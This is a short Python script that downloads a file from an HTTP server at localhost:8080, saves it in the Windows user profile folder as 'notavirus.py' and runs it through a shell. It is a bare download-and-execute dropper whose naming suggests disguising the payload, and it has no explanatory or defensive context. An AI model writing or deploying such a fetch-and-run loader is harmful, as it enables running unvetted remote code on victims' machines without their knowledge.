from http.client import EXPECTATION_FAILED
import aiohttp
import asyncio
import urllib.request
import time
import subprocess
from contextlib import contextmanager
import sys, os

def download():
    nurl = 'http://localhost:8080/script2.py'
    urllib.request.urlretrieve(nurl, os.environ['USERPROFILE'] + '/notavirus.py')

async def main():
    async with aiohttp.ClientSession(trust_env=True) as session:
        download()
        subprocess.Popen(os.environ['USERPROFILE'] + '/notavirus.py', shell=True)

loop = asyncio.get_event_loop()
loop.run_until_complete(main())